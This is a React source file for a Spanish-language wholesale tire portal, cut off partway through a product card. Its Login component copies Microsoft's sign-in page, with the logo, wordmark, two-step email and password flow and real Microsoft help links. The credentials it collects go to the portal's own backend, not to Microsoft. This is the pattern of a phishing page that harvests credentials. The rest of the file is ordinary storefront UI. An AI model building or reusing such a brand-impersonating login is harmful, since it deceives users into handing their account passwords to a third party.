import React, { useState, useEffect } from 'react';
import {
  Package,
  ClipboardList,
  Settings,
  Bell,
  Clock,
  User,
  ChevronDown,
  ShieldCheck,
  Factory,
  Search,
  Filter,
  Zap,
  ShoppingCart,
  Plus,
  Minus,
  Trash2,
  Lock,
  ArrowRight,
  LogOut,
  CheckCircle2,
  CreditCard,
  FileText,
  DollarSign,
  Truck,
  LayoutGrid,
  Shield,
  Menu,
  X,
  LayoutGrid as HomeIcon,
  Star,
  Disc,
  ChevronLeft,
  ChevronRight,
  ArrowUpRight,
  TrendingUp,
  Info,
  Box,
  CreditCard as CardIcon,
  Smartphone,
  Building2,
  AlertCircle
} from 'lucide-react';
import { ResponsiveContainer, BarChart, Bar, LineChart, Line, PieChart, Pie, Cell, XAxis, YAxis, CartesianGrid, Tooltip, Legend } from 'recharts';

// Assets
const LOGO_SRC = "/assets/tech_flow_logo.png";
const ROBOT_IMG = "/assets/robotic_arm_industrial.png";
const LOOM_IMG = "/assets/industrial_textile_loom.png";
const PRODUCT_CARPET = "/assets/b2b_industrial_carpet_roll.png";
const PRODUCT_FIBER = "/assets/b2b_specialized_fiber_reels.png";
const PRODUCT_ADHESIVE = "/assets/b2b_industrial_adhesive_drums.png";

// En desarrollo: localhost, en producción: Azure Functions
const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001/api';

// --- COMPONENTS ---

const Login = ({ onLogin }) => {
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1); // 1: Email, 2: Password
  const [credentials, setCredentials] = useState({ username: '', password: '' });

  const handleNext = (e) => {
    e.preventDefault();
    if (step === 1 && credentials.username) setStep(2);
    else if (step === 2 && credentials.password) handleSubmit();
  };

  const handleSubmit = () => {
    setLoading(true);
    fetch(`${API_URL}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials)
    })
      .then(res => res.json())
      .then(data => {
        setTimeout(() => {
          setLoading(false);
          if (data.success) onLogin(data.user);
          else alert(data.message);
        }, 800);
      });
  };

  return (
    <div style={{
      height: '100vh',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      backgroundColor: '#f2f2f2',
      backgroundImage: `
        radial-gradient(at 0% 0%, rgba(198, 224, 255, 0.5) 0px, transparent 50%),
        radial-gradient(at 50% 0%, rgba(255, 225, 235, 0.5) 0px, transparent 50%),
        radial-gradient(at 100% 0%, rgba(220, 255, 235, 0.5) 0px, transparent 50%),
        radial-gradient(at 0% 100%, rgba(255, 245, 210, 0.5) 0px, transparent 50%),
        radial-gradient(at 100% 100%, rgba(230, 210, 255, 0.5) 0px, transparent 50%)
      `,
      backgroundSize: 'cover',
      fontFamily: '"Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe WP", "Segoe UI Symbol", "Meiryo UI", "Arial", sans-serif'
    }}>
      <div style={{ width: '440px', padding: '20px' }}>
        <div style={{
          backgroundColor: '#ffffff',
          padding: '44px',
          boxShadow: '0 2px 6px rgba(0,0,0,0.2)',
          minHeight: '380px',
          display: 'flex',
          flexDirection: 'column',
          position: 'relative'
        }}>
          {loading && <div className="ms-progress-bar" />}
          {/* Microsoft Logo & Text Simulation */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2px', width: '21px', height: '21px' }}>
              <div style={{ backgroundColor: '#f25022' }}></div>
              <div style={{ backgroundColor: '#7fbb00' }}></div>
              <div style={{ backgroundColor: '#00a1f1' }}></div>
              <div style={{ backgroundColor: '#ffbb00' }}></div>
            </div>
            <span style={{ fontSize: '21px', color: '#737373', fontWeight: 600, letterSpacing: '-0.01em' }}>Microsoft</span>
          </div>

          <h2 style={{ fontSize: '24px', fontWeight: 600, color: '#1b1b1b', marginBottom: '16px' }}>
            {step === 1 ? 'Iniciar sesión' : 'Escribir contraseña'}
          </h2>

          {step === 2 && (
            <div style={{ marginBottom: '16px', fontSize: '15px', color: '#1b1b1b', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <button onClick={() => setStep(1)} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }} title="Atrás">
                <ArrowRight size={16} style={{ transform: 'rotate(180deg)' }} />
              </button>
              {credentials.username}
            </div>
          )}

          <form onSubmit={handleNext} style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
            {step === 1 ? (
              <input
                type="text"
                placeholder="Correo electrónico, teléfono o Skype"
                required
                autoFocus
                value={credentials.username}
                onChange={e => setCredentials({ ...credentials, username: e.target.value })}
                style={{
                  width: '100%',
                  padding: '8px 0',
                  marginBottom: '12px',
                  border: 'none',
                  borderBottom: '1px solid #666',
                  outline: 'none',
                  fontSize: '15px'
                }}
              />
            ) : (
              <input
                type="password"
                placeholder="Contraseña"
                required
                autoFocus
                value={credentials.password}
                onChange={e => setCredentials({ ...credentials, password: e.target.value })}
                style={{
                  width: '100%',
                  padding: '8px 0',
                  marginBottom: '12px',
                  border: 'none',
                  borderBottom: '1px solid #666',
                  outline: 'none',
                  fontSize: '15px'
                }}
              />
            )}

            <div style={{ fontSize: '13px', color: '#1b1b1b', marginBottom: '12px' }}>
              {step === 1 ? (
                <span>¿No tiene una cuenta? <span onClick={() => window.open('https://signup.live.com/', '_blank')} style={{ color: '#0067b8', cursor: 'pointer' }}>Cree una ahora mismo.</span></span>
              ) : (
                <span onClick={() => window.open('https://account.live.com/password/reset', '_blank')} style={{ color: '#0067b8', cursor: 'pointer' }}>¿Olvidó su contraseña?</span>
              )}
            </div>

            <div style={{ fontSize: '13px', color: '#0067b8', marginBottom: '24px', cursor: 'pointer' }}>
              {step === 1 ? (
                <span onClick={() => window.open('https://account.live.com/acsr', '_blank')}>¿No puede acceder a su cuenta?</span>
              ) : (
                <span>Otras formas de iniciar sesión</span>
              )}
            </div>

            <div style={{ marginTop: 'auto', display: 'flex', justifyContent: 'flex-end', gap: '8px' }}>
              {step === 2 && (
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  style={{
                    padding: '8px 20px',
                    backgroundColor: '#cccccc',
                    color: '#1b1b1b',
                    fontSize: '15px',
                    border: 'none',
                    cursor: 'pointer',
                    minWidth: '108px'
                  }}
                >
                  Atrás
                </button>
              )}
              <button
                type="submit"
                disabled={loading}
                style={{
                  padding: '8px 20px',
                  backgroundColor: '#0067b8',
                  color: 'white',
                  fontSize: '15px',
                  border: 'none',
                  cursor: 'pointer',
                  minWidth: '108px'
                }}
              >
                {step === 1 ? 'Siguiente' : 'Iniciar sesión'}
              </button>
            </div>
          </form>
        </div>

        <div style={{
          marginTop: '28px',
          backgroundColor: '#ffffff',
          padding: '12px 44px',
          boxShadow: '0 2px 6px rgba(0,0,0,0.1)',
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          cursor: 'pointer'
        }}>
          <Lock size={20} color="#5e5e5e" />
          <span style={{ fontSize: '15px', color: '#1b1b1b' }}>Opciones de inicio de sesión</span>
        </div>
      </div>

      <div style={{ position: 'fixed', bottom: '24px', right: '48px', display: 'flex', gap: '24px', fontSize: '12px', color: '#1b1b1b' }}>
        <span onClick={() => window.open('https://www.microsoft.com/es-mx/servicesagreement/', '_blank')} style={{ cursor: 'pointer' }}>Términos de uso</span>
        <span onClick={() => window.open('https://privacy.microsoft.com/es-mx/privacystatement', '_blank')} style={{ cursor: 'pointer' }}>Privacidad y cookies</span>
        <span>...</span>
      </div>
    </div>
  );
};

const HomeDashboard = ({ user, onViewChange }) => {
  const [currentSlide, setCurrentSlide] = useState(0);
  const slides = [
    {
      image: '/banner1.png',
      title: 'Soluciones de Equipo Original',
      subtitle: 'La tecnología más avanzada para tu catálogo de distribución.'
    },
    {
      image: '/banner2_clean.png',
      title: 'Logística de Clase Mundial',
      subtitle: 'Distribución eficiente y tiempos de entrega garantizados.'
    },
    {
      image: '/cat_account_v2.png',
      title: 'Control Financiero Integral',
      subtitle: 'Accede a tu estado de cuenta y facturación en tiempo real.'
    },
    {
      image: '/promo_realistic.png',
      title: 'Promociones Exclusivas',
      subtitle: 'Aprovecha descuentos especiales y financiamiento preferencial.'
    }
  ];

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide(s => (s + 1) % slides.length);
    }, 5000);
    return () => clearInterval(timer);
  }, [slides.length]);

  return (
    <div style={{ animation: 'fadeIn 0.5s ease', maxWidth: '1400px', margin: '0 auto' }}>
      {/* Hero Carousel */}
      <div style={{ position: 'relative', height: '480px', borderRadius: '16px', overflow: 'hidden', marginBottom: '48px', boxShadow: 'var(--shadow-md)' }}>
        {slides.map((slide, i) => (
          <div key={i} style={{
            position: 'absolute',
            top: 0,
            left: 0,
            width: '100%',
            height: '100%',
            opacity: currentSlide === i ? 1 : 0,
            transition: 'opacity 1s ease',
            backgroundImage: `linear-gradient(rgba(0,0,0,0.2), rgba(0,0,0,0.6)), url(${slide.image})`,
            backgroundSize: 'cover',
            backgroundPosition: 'center',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'center',
            padding: '80px',
            color: 'white'
          }}>
            <h1 style={{ fontSize: '48px', fontWeight: 800, marginBottom: '16px', maxWidth: '600px' }}>{slide.title}</h1>
            <p style={{ fontSize: '20px', opacity: 0.9, marginBottom: '32px', maxWidth: '500px' }}>{slide.subtitle}</p>
            <button
              onClick={() => onViewChange('b2b')}
              style={{ padding: '16px 32px', backgroundColor: 'var(--accent-blue)', color: 'white', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 700, width: 'fit-content', display: 'flex', alignItems: 'center', gap: '12px' }}
            >
              Explorar Catálogo <ArrowUpRight size={20} />
            </button>
          </div>
        ))}
        {/* Carousel Controls */}
        <div style={{ position: 'absolute', bottom: '32px', left: '80px', display: 'flex', gap: '8px' }}>
          {slides.map((_, i) => (
            <div key={i} onClick={() => setCurrentSlide(i)} style={{ width: currentSlide === i ? '32px' : '8px', height: '8px', backgroundColor: 'white', borderRadius: '4px', cursor: 'pointer', transition: 'all 0.3s' }} />
          ))}
        </div>
      </div>

      <div style={{ textAlign: 'center', marginBottom: '64px', padding: '0 200px' }}>
        <h2 style={{ fontSize: '32px', color: 'var(--primary-navy)', marginBottom: '16px' }}>En el Portal de Distribución Mayorista</h2>
        <p style={{ fontSize: '18px', color: 'var(--grey-text)', lineHeight: '1.6' }}>
          Contamos con una amplia variedad de llantas para equipar el espacio de tus Almacenes.
          <b> Conoce las últimas tendencias en tecnología automotriz</b> y haz de cualquier flota un equipo único.
        </p>
      </div>

      {/* Navigation Carousel */}
      <div style={{ position: 'relative', marginBottom: '80px', padding: '0 40px' }}>
        <div style={{
          display: 'flex',
          gap: '24px',
          overflowX: 'auto',
          scrollSnapType: 'x mandatory',
          paddingBottom: '20px',
          msOverflowStyle: 'none',
          scrollbarWidth: 'none',
          scrollBehavior: 'smooth'
        }} id="nav-carousel">
          {[
            { id: 'b2b', label: 'Catálogo Mayorista', image: '/cat_catalog_v2.png', desc: 'Accede a nuestra lista completa de productos.' },
            { id: 'account', label: 'Estado de Cuenta', image: '/cat_account_v2.png', desc: 'Consulta tus facturas y saldos pendientes.' },
            { id: 'promos', label: 'Promociones Vigentes', image: '/promo_realistic.png', desc: 'Aprovecha descuentos exclusivos por volumen.' },
            { id: 'billing', label: 'Facturación / XML', image: '/cat_billing.png', desc: 'Descarga tus facturas y archivos XML.' },
            { id: 'cart', label: 'Carrito', image: '/cat_cart.png', desc: 'Visauliza tu carrito de compras.' }
          ].map((item, i) => (
            <div
              key={i}
              onClick={() => onViewChange(item.id)}
              style={{
                flex: '0 0 350px',
                scrollSnapAlign: 'start',
                cursor: 'pointer',
                borderRadius: '16px',
                overflow: 'hidden',
                backgroundColor: 'white',
                border: '1px solid var(--grey-border)',
                boxShadow: '0 10px 30px rgba(0,0,0,0.05)',
                transition: 'all 0.3s ease'
              }}
              onMouseOver={e => e.currentTarget.style.transform = 'translateY(-10px)'}
              onMouseOut={e => e.currentTarget.style.transform = 'translateY(0)'}
            >
              <div style={{ backgroundColor: 'var(--primary-navy)', color: 'white', padding: '24px', textAlign: 'center' }}>
                <h3 style={{ fontSize: '20px', fontWeight: 700, letterSpacing: '-0.02em' }}>{item.label}</h3>
              </div>
              <div style={{ position: 'relative', height: '400px', overflow: 'hidden' }}>
                <img
                  src={item.image}
                  alt={item.label}
                  style={{ width: '100%', height: '100%', objectFit: 'cover' }}
                />
                <div style={{
                  position: 'absolute',
                  bottom: 0,
                  left: 0,
                  width: '100%',
                  padding: '32px',
                  background: 'linear-gradient(transparent, rgba(26, 43, 60, 0.95))',
                  color: 'white'
                }}>
                  <p style={{ fontSize: '15px', lineHeight: '1.5', opacity: 0.9 }}>{item.desc}</p>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginTop: '16px', fontWeight: 700, fontSize: '13px', color: 'var(--accent-blue)' }}>
                    Explorar ahora <ArrowUpRight size={16} />
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Carousel Navigation Buttons */}
        <button
          onClick={() => document.getElementById('nav-carousel').scrollBy({ left: -374, behavior: 'smooth' })}
          style={{ position: 'absolute', left: '0', top: '50%', transform: 'translateY(-50%)', width: '50px', height: '50px', borderRadius: '50%', border: 'none', backgroundColor: 'white', boxShadow: '0 4px 15px rgba(0,0,0,0.1)', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 5 }}
        >
          <ChevronLeft size={24} color="var(--primary-navy)" />
        </button>
        <button
          onClick={() => document.getElementById('nav-carousel').scrollBy({ left: 374, behavior: 'smooth' })}
          style={{ position: 'absolute', right: '0', top: '50%', transform: 'translateY(-50%)', width: '50px', height: '50px', borderRadius: '50%', border: 'none', backgroundColor: 'white', boxShadow: '0 4px 15px rgba(0,0,0,0.1)', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 5 }}
        >
          <ChevronRight size={24} color="var(--primary-navy)" />
        </button>
      </div>

      {/* Sección adicional afín al portal */}
      <div style={{ maxWidth: '1200px', margin: '0 auto 80px', padding: '0 24px' }}>
        <h2 style={{ fontSize: '32px', color: 'var(--primary-navy)', marginBottom: '12px' }}>Recursos destacados</h2>
        <p style={{ fontSize: '17px', color: 'var(--grey-text)', lineHeight: 1.6, marginBottom: '32px' }}>
          Encuentra herramientas, guías y beneficios pensados para optimizar tus compras al mayoreo y mantener tu flota al 100%.
        </p>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '24px' }}>
          {[
            {
              icon: <ShieldCheck size={28} color="var(--accent-blue)" />,
              title: 'Quiénes somos',
              desc: 'Somos el canal mayorista líder en soluciones de neumáticos para flotas y distribuidores. Con más de 20 años de experiencia, entregamos calidad y servicio especializado.',
              action: 'Conoce más'
            },
            {
              icon: <Building2 size={28} color="var(--accent-blue)" />,
              title: 'Nuestra trayectoria',
              desc: 'Desde origen local hasta presencia nacional: conoce cómo evolucionamos para convertirnos en un socio estratégico para empresas de transporte y logística.',
              action: 'Ver historia'
            },
            {
              icon: <Smartphone size={28} color="var(--accent-blue)" />,
              title: 'Soporte y contacto',
              desc: '¿Necesitas ayuda con un pedido o cotización? Contáctanos para atención personalizada, asesoría técnica y planes a medida.',
              action: 'Contactar'
            }
          ].map((item, i) => (
            <div key={i} style={{
              background: 'white',
              borderRadius: '16px',
              padding: '28px',
              border: '1px solid var(--grey-border)',
              boxShadow: '0 18px 40px rgba(0,0,0,0.06)',
              display: 'flex',
              flexDirection: 'column',
              gap: '18px'
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                {item.icon}
                <h3 style={{ margin: 0, fontSize: '18px', color: 'var(--primary-navy)' }}>{item.title}</h3>
              </div>
              <p style={{ margin: 0, fontSize: '14px', color: 'var(--grey-text)', lineHeight: 1.6 }}>{item.desc}</p>
              <button
                onClick={() => alert(item.title)}
                style={{
                  marginTop: 'auto',
                  alignSelf: 'flex-start',
                  padding: '10px 18px',
                  borderRadius: '10px',
                  border: 'none',
                  backgroundColor: 'var(--accent-blue)',
                  color: 'white',
                  cursor: 'pointer',
                  fontWeight: 700,
                  boxShadow: '0 10px 20px rgba(0,0,0,0.12)'
                }}
              >
                {item.action}
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

const Sidebar = ({ onViewChange, currentView, isOpen, onClose, onLogout }) => (
  <div style={{
    width: isOpen ? '280px' : '0',
    backgroundColor: 'var(--primary-navy)',
    color: 'white',
    height: '100vh',
    position: 'fixed',
    top: 0,
    left: 0,
    zIndex: 1000,
    overflow: 'hidden',
    transition: 'width 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
    display: 'flex',
    flexDirection: 'column',
    boxShadow: isOpen ? '0 0 20px rgba(0,0,0,0.3)' : 'none'
  }}>
    <div style={{
      height: '70px',
      padding: '0 24px',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'space-between',
      borderBottom: '1px solid rgba(255,255,255,0.1)',
      minWidth: '280px'
    }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
        <div style={{
          width: '40px',
          height: '40px',
          backgroundColor: 'white',
          borderRadius: '8px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          overflow: 'hidden',
          padding: '2px',
          boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
        }}>
          <img
            src="/logo.png"
            alt="Logo"
            style={{ width: '100%', height: '100%', objectFit: 'contain' }}
          />
        </div>
        <span style={{ fontWeight: 800, fontSize: '20px', letterSpacing: '-0.02em', color: 'white' }}>Portal</span>
      </div>
      <button
        onClick={onClose}
        style={{ background: 'none', border: 'none', cursor: 'pointer', padding: '8px', color: 'rgba(255,255,255,0.6)' }}
      >
        <X size={20} />
      </button>
    </div>

    <nav style={{ display: 'flex', flexDirection: 'column', padding: '16px 8px', minWidth: '280px' }}>
      {[
        { id: 'home', label: 'Inicio', icon: HomeIcon },
        { id: 'b2b', label: 'Catálogo de Llantas', icon: Package },
        { id: 'promos', label: 'Promociones Vigentes', icon: TrendingUp },
        { id: 'orders', label: 'Mis Órdenes', icon: ClipboardList },
        { id: 'cart', label: 'Carrito', icon: ShoppingCart },
        { id: 'account', label: 'Estado de Cuenta', icon: CreditCard },
        { id: 'billing', label: 'Facturación / XML', icon: FileText }
      ].map((item) => (
        <button
          key={item.id}
          onClick={() => { onViewChange(item.id); onClose(); }}
          style={{
            background: currentView === item.id ? 'rgba(255,255,255,0.1)' : 'none',
            border: 'none',
            borderRadius: '6px',
            color: currentView === item.id ? 'white' : 'rgba(255,255,255,0.7)',
            padding: '12px 16px',
            margin: '2px 0',
            fontSize: '14px',
            fontWeight: currentView === item.id ? 600 : 400,
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '12px',
            transition: 'all 0.2s',
            textAlign: 'left'
          }}
        >
          <item.icon size={18} style={{ opacity: currentView === item.id ? 1 : 0.7 }} />
          {item.label}
        </button>
      ))}
    </nav>

    <div style={{ marginTop: 'auto', padding: '16px', borderTop: '1px solid rgba(255,255,255,0.1)', minWidth: '280px' }}>
      <button
        onClick={() => { onLogout(); onClose(); }}
        style={{
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          color: 'var(--status-stop)',
          fontSize: '14px',
          fontWeight: 600,
          padding: '12px 16px',
          background: 'rgba(239, 68, 68, 0.1)',
          border: 'none',
          borderRadius: '8px',
          width: '100%',
          textAlign: 'left',
          cursor: 'pointer',
          transition: 'all 0.2s'
        }}
      >
        <LogOut size={18} /> Cerrar Sesión
      </button>
    </div>
  </div>
);

const Topbar = ({ user, cartCount, onLogout, onViewChange, onToggleSidebar }) => (
  <header style={{
    height: '70px',
    backgroundColor: 'var(--white)',
    color: 'var(--primary-navy)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    padding: '0 24px',
    borderBottom: '1px solid var(--grey-border)',
    position: 'sticky',
    top: 0,
    zIndex: 100
  }}>
    <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
      <button
        onClick={onToggleSidebar}
        style={{
          background: 'none',
          border: '1px solid var(--grey-border)',
          borderRadius: '6px',
          padding: '8px',
          cursor: 'pointer',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          color: 'var(--primary-navy)',
          transition: 'all 0.2s'
        }}
      >
        <Menu size={20} />
      </button>
      <div style={{
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        width: '56px',
        height: '56px',
        backgroundColor: 'white',
        borderRadius: '12px',
        boxShadow: '0 4px 15px rgba(0,0,0,0.08)',
        overflow: 'hidden',
        border: '1px solid var(--grey-border)',
        padding: '4px'
      }}>
        <img
          src="/logo.png"
          alt="Logo"
          style={{ width: '100%', height: '100%', objectFit: 'contain' }}
        />
      </div>
      <div style={{ display: 'flex', flexDirection: 'column' }}>
        <span style={{
          fontWeight: 800,
          fontSize: '22px',
          lineHeight: '1',
          color: 'var(--primary-navy)',
          letterSpacing: '-0.03em'
        }}>
          Portal
        </span>
        <span style={{ fontSize: '10px', color: 'var(--grey-text)', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.1em' }}>
          Distribution Hub
        </span>
      </div>
    </div>

    <div style={{ display: 'flex', alignItems: 'center', gap: '32px' }}>

      <div
        onClick={() => onViewChange('cart')}
        style={{ position: 'relative', cursor: 'pointer' }}
      >
        <ShoppingCart size={22} color="var(--primary-navy)" />
        {cartCount > 0 && (
          <div
            key={cartCount} // Re-triggers animation on count change
            style={{
              position: 'absolute',
              top: '-8px',
              right: '-8px',
              backgroundColor: 'var(--status-stop)',
              color: 'white',
              fontSize: '10px',
              fontWeight: 800,
              width: '18px',
              height: '18px',
              borderRadius: '50%',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              border: '2px solid white',
              animation: 'pulse 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)'
            }}>
            {cartCount}
          </div>
        )}
      </div>

      <div style={{ display: 'flex', alignItems: 'center', gap: '12px', paddingLeft: '24px', borderLeft: '1px solid var(--grey-border)' }}>
        <div style={{ textAlign: 'right' }}>
          <p style={{ fontSize: '14px', fontWeight: 700 }}>{user?.name}</p>
          <p style={{ fontSize: '11px', color: 'var(--status-operative)', fontWeight: 700, textTransform: 'uppercase' }}>{user?.role}</p>
        </div>
        <button
          onClick={onLogout}
          style={{
            width: '36px',
            height: '36px',
            borderRadius: '50%',
            backgroundColor: 'var(--bg-slate)',
            border: '1px solid var(--grey-border)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            cursor: 'pointer',
            transition: 'all 0.2s'
          }}>
          <LogOut size={16} color="var(--status-stop)" />
        </button>
      </div>
    </div>
  </header>
);

// --- COMPONENTS ---

const ProductCard = ({ product, onAddToCart, onUpdateQty, cartItem }) => {
  const [showDetails, setShowDetails] = useState(false);
  const [openSections, setOpenSections] = useState({
    tech: false,
    specs: false,
    volume: false,
    stock: false
  });

  const toggleSection = (section) => {
    setOpenSections(prev => ({ ...prev, [section]: !prev[section] }));
  };

  const DetailSection = ({ title, icon, sectionKey, children }) => {
    const isOpen = openSections[sectionKey];
    return (
      <div style={{ marginBottom: '8px' }}>
        <button
          onClick={() => toggleSection(sectionKey)}
          style={{
            width: '100%',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            padding: '10px 14px',
            backgroundColor: isOpen ? 'var(--primary-navy)' : 'white',
            color: isOpen ? 'white' : 'var(--primary-navy)',
            border: '1px solid var(--grey-border)',
            borderRadius: '8px',
            cursor: 'pointer',
            fontSize: '11px',
            fontWeight: 800,
            textTransform: 'uppercase',
            letterSpacing: '0.05em',
            transition: 'all 0.2s ease',
            boxShadow: isOpen ? '0 4px 12px rgba(26, 43, 60, 0.15)' : 'none'
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            {icon}
            {title}
          </div>
          <ChevronDown size={14} style={{ transform: isOpen ? 'rotate(180deg)' : 'none', transition: 'transform 0.2s' }} />
        </button>
        {isOpen && (
          <div style={{
            padding: '14px',
            backgroundColor: 'rgba(255,255,255,0.4)',
            border: '1px solid var(--grey-border)',
            borderTop: 'none',
            borderBottomLeftRadius: '8px',
            borderBottomRightRadius: '8px',
            animation: 'fadeIn 0.2s ease',
            fontSize: '13px'
          }}>
            {children}
          </div>
        )}
      </div>
    );
  };

  return (
    <div
      onMouseOver={e => {
        e.currentTarget.style.transform = 'scale(1.02)';
        e.currentTarget.style.boxShadow = '0 20px 40px rgba(0,0,0,0.12)';
      }}
      onMouseOut={e => {
        e.currentTarget.style.transform = 'scale(1)';
        e.currentTarget.style.boxShadow = 'var(--shadow-sm)';
      }}
      style={{
        backgroundColor: '#ffffff',
        borderRadius: '12px',
        overflow: 'hidden',
        border: '1px solid var(--grey-border)',
        boxShadow: 'var(--shadow-sm)',
        display: 'flex',
        flexDirection: 'column',
        transition: 'all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)'
      }}
    >
      <div style={{ 
        height: '240px', 
        backgroundColor: '#ffffff', 
        display: 'flex', 
        alignItems: 'center', 
        justifyContent: 'center', 
        overflow: 'hidden', 
        position: 'relative',
        border: 'none',
        boxShadow: 'none'
      }}>
        <img 
          src={product.image} 
          alt={product.name} 
          style={{ 
            maxWidth: '100%', 
            maxHeight: '100%', 
            objectFit: 'contain',
            transition: 'transform 0.5s ease',
            mixBlendMode: 'multiply',
            filter: 'contrast(1.05) brightness(1.02)'
          }}
          className="product-image-hover"
        />
        <div style={{
          position: 'absolute',
          bottom: '12px',
          left: '12px',
          backgroundColor: 'var(--primary-navy)',
          color: 'white',
          padding: '4px 12px',
          borderRadius: '4px',
          fontSize: '10px',
          fontWeight: 600,
          textTransform: 'uppercase',
          letterSpacing: '0.05em',
          zIndex: 2
        }}>
          {product.category}
        </div>
      </div>

      <div style={{ padding: '24px', flex: 1, display: 'flex', flexDirection: 'column' }}>
        <div style={{ marginBottom: '16px' }}>
          <h4 style={{ fontSize: '18px', margin: '0 0 4px 0', color: 'var(--primary-navy)' }}>{product.name}</h4>
          <p style={{ fontSize: '12px', color: 'var(--grey-text)', marginBottom: '12px' }} className="mono">{product.id}</p>

          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end', marginBottom: '16px' }}>
            <div>
              <p style={{ fontSize: '22px', fontWeight: 700, color: 'var(--primary-navy)' }}>${product.price.toFixed(2)} <span style={{ fontSize: '12px', color: 'var(--grey-text)' }}>MXN</span></p>
              <p style={{ fontSize: '12px', color: 'var(--grey-text)' }}>por {product.unit}</p>
            </div>
          </div>
        </div>

        <button
          onClick={() => setShowDetails(!showDetails)}
          style={{
            background: showDetails ? 'var(--bg-slate)' : 'none',
            border: '1px solid var(--grey-border)',
            borderRadius: '6px',
            padding: '8px',
            fontSize: '12px',
            fontWeight: 600,
            color: 'var(--primary-navy)',
            cursor: 'pointer',
            marginBottom: '16px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '8px',
            transition: 'all 0.2s'
          }}
        >
          {showDetails ? 'Cerrar Ficha' : 'Ficha Técnica y Mayoreo'}
          <ChevronDown size={14} style={{ transform: showDetails ? 'rotate(180deg)' : 'none', transition: 'transform 0.2s' }} />
        </button>

        {showDetails && (
          <div style={{
            backgroundColor: 'var(--bg-slate)',
            padding: '16px',
            borderRadius: '12px',
            marginBottom: '16px',
            border: '1px solid var(--grey-border)',
            animation: 'fadeIn 0.3s ease'
          }}>
            {product.techSpecs && (
              <DetailSection
                title={`Características Principales (${product.techSpecs.width}/${product.techSpecs.ratio} ${product.techSpecs.construction}${product.techSpecs.rim})`}
                icon={<Settings size={14} />}
                sectionKey="tech"
              >
                <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: '8px' }}>
                  <div style={{ backgroundColor: 'white', padding: '10px 14px', borderRadius: '8px', border: '1px solid rgba(0,0,0,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ flex: 1 }}>
                      <p style={{ fontSize: '11px', fontWeight: 800, color: 'var(--primary-navy)', margin: 0 }}>ANCHO ({product.techSpecs.width})</p>
                      <p style={{ fontSize: '10px', color: 'var(--grey-text)', margin: 0 }}>Anchura de la llanta en milímetros.</p>
                    </div>
                    <span style={{ fontSize: '14px', fontWeight: 800, color: 'var(--status-operative)' }}>{product.techSpecs.width} mm</span>
                  </div>
                  <div style={{ backgroundColor: 'white', padding: '10px 14px', borderRadius: '8px', border: '1px solid rgba(0,0,0,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ flex: 1 }}>
                      <p style={{ fontSize: '11px', fontWeight: 800, color: 'var(--primary-navy)', margin: 0 }}>RELACIÓN ASPECTO ({product.techSpecs.ratio})</p>
                      <p style={{ fontSize: '10px', color: 'var(--grey-text)', margin: 0 }}>Altura de la pared lateral como % del ancho.</p>
                    </div>
                    <span style={{ fontSize: '14px', fontWeight: 800, color: 'var(--status-operative)' }}>{product.techSpecs.ratio}%</span>
                  </div>
                  <div style={{ backgroundColor: 'white', padding: '10px 14px', borderRadius: '8px', border: '1px solid rgba(0,0,0,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ flex: 1 }}>
                      <p style={{ fontSize: '11px', fontWeight: 800, color: 'var(--primary-navy)', margin: 0 }}>CONSTRUCCIÓN ({product.techSpecs.construction})</p>
                      <p style={{ fontSize: '10px', color: 'var(--grey-text)', margin: 0 }}>{product.techSpecs.construction === 'R' ? 'Radial (especificada para autos actuales).' : 'Diagonal / Especial.'}</p>
                    </div>
